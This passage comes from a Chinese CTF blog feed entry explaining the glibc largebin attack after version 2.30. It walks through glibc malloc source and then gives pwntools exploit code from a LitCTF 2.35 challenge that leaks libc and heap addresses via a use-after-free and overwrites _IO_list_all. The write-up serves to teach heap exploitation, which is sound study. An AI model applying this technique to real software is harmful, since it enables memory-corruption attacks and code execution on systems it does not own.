class="line">            <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                size |= PREV_INUSE;</span><br><span class="line">                <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">      &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                  &#123;</span><br><span class="line">                    fwd = bck;</span><br><span class="line">                    bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                  &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    assert (chunk_main_arena (fwd));</span><br><span class="line">                    <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                      &#123;</span><br><span class="line">                        fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">  assert (chunk_main_arena (fwd));</span><br><span class="line">                      &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size</span><br><span class="line">  == (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                      <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                      fwd = fwd-&gt;fd;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                      &#123;</span><br><span class="line">                        victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                        <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                          malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">                        fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                      &#125;</span><br><span class="line">                    bck = fwd-&gt;bk;</span><br><span class="line">                    <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">                      malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        mark_bin (av, victim_index);</span><br><span class="line">        victim-&gt;bk = bck;</span><br><span class="line">        victim-&gt;fd = fwd;</span><br><span class="line">        fwd-&gt;bk = victim;</span><br><span class="line">        bck-&gt;fd = victim;</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure><p>如果chunk在smallbin范围，则插入到smallbin中，如果不是，则进行下一步，进行插入largebin的处理。此时<code>bck</code>是对应index的bin头。<code>victim</code>指的是当前正在被释放的chunk。</p><p>第17行的if与第60行的else匹配，检查如果该bin为空，则直接将victim的nextsize都指向自身，fd和bk指向bin头。如果不为空则进入下一个检查。</p><p>第42行检查victim的size是否小于当前bin中最小的那个chunk，则直接将victim插入到bin的头部。在这里有个很重要的语句（第31行），也是我们需要利用到的语句。我们来逐行解释一下这个语句块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fwd = bck;</span><br><span class="line">bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure><p>为避免歧义，首先说明，在这些语句执行完之前我们不认为victim已经进入了bin。首先将<code>fwd</code>赋值为bin头，然后<code>bck</code>赋值为当前bin中最小那个chunk。紧接着将victim的<code>fd_nextsize</code>赋值为bin中的尾堆块，然后将<code>bk_nextsize</code>赋值为当前bin中最小的chunk。然后重点来了！当前bin中的尾堆块的<code>bk_nextsize</code>指向victim，当前最小chunk的<code>fd_nextsize</code>也指向victim。现在我们才视为victim完全进入了largebin当中。</p><p>可以注意到在这个过程，有两个指针被赋值为victim的地址。如果我们在释放victim之前有机会修改当前bin中最小chunk的<code>bk_nextsize</code>为<code>target</code>，那也就意味着我们可以往<code>target+0x20的位置</code>写入victim的地址。这个结果就是我们所说的largebin attack的结果。</p><p>2.30前后的区别在于第50行和第57行的两个检查，多了两个检查所以就不能使用传统的largebin attack方法了。</p><h3 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h3><p>其实可以看how2heap的PoC学习，这里我直接结合<a href="https://c-lby.top/2024/06/04/2024-litctf-wp/#0x05-2-35">2024litctf的2.35</a>那题来讲。</p><p>根据源码分析，我们如果想要执行到那条重要语句，我们需要先后释放掉一大一小两个largechunk。在每个largechunk下面要多一个chunk用来防止largechunk被释放后被向下合并，大小任意。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x30</span>) </span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x30</span>)</span><br></pre></td></tr></table></figure><p>接着我们释放<code>chunk2</code>。这时候它先进入到<code>unsortedbin</code>中，我们申请一个比<code>chunk2</code>还要大的chunk，因为<code>chunk2</code>不够被分配，所以它会被整理到largebin当中。这时候他就同时拥有了libc地址和heap地址。</p><p>因为有UAF，所以可以直接从<code>chunk2</code>泄露出libc地址和heap。因为show函数使用的是printf语句，所以要注意\x00截断的问题：保护chunk如果是0x20，那么<code>chunk2</code>的地址最后一个字节刚好是\x00，那就没法泄露了；fd和bk是指向main_arena+0x490处的libc地址，同样有\x00字节，所以在泄露堆地址的时候要先随便填点什么00之外的东西在fd和bk位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x530</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">large = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))  <span class="comment"># 其实是main_arena+0x490</span></span><br><span class="line">libcbase = large - <span class="number">0x670</span> - libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]  <span class="comment"># 也可以直接看vmmap动调出偏移</span></span><br><span class="line">log.success(<span class="string">&#x27;libcbase: &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">r.recv(<span class="number">0x10</span>)</span><br><span class="line">heap = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;heap: &#x27;</span> + <span class="built_in">hex</span>(heap))</span><br></pre></td></tr></table></figure><p>然后我们释放<code>chunk0</code>进入到<code>unsrotedbin</code>中，然后修改<code>chunk2</code>的<code>bk_nextsize</code>为<code>_IO_list_all-0x20</code>(因为后续会打house of apple2)。接着我们申请一个大于chunk2的chunk，把chunk0放进largebin中。注意改chunk2的时候除了<code>bk_nextsize</code>其他东西尽量保持原状，因为会检查其他三项的合法性。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, p64(large) + p64(large) + p64(heap) + p64(_IO_list_all - <span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x550</span>)</span><br></pre></td></tr></table></figure><p>根据源码分析，我们可以知道<code>_IO_list_all</code>就会被写入chunk0的地址。至此，largebin attack就算完成了。</p><p>我们断点检查一下：</p><p><img src="https://c-lby.top/images/largebin_attack/2.35%E6%94%BB%E5%87%BB%E7%BB%93%E6%9E%9C.png" alt="2.35攻击结果"></p><p>可以看到_IO_list_all已经被写入chunk0的地址了。后面就是house of apple2了，这里不展开赘述。</p>]]></content>
    
    
    <summary type="html">largebin attack分为2.30前和2.30后两种情况。这里记录2.30后的攻击方法，2.30前的可以看[hollk师傅](https://blog.csdn.net/qq_41202237/article/details/112825556)的讲解。</summary>
    
    
    
    <category term="Heap Exploitation" scheme="https://c-lby.top/categories/Heap-Exploitation/"/>
    
    
    <category term="heap" scheme="https://c-lby.top/tags/heap/"/>
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
  </entry>
  
</feed>
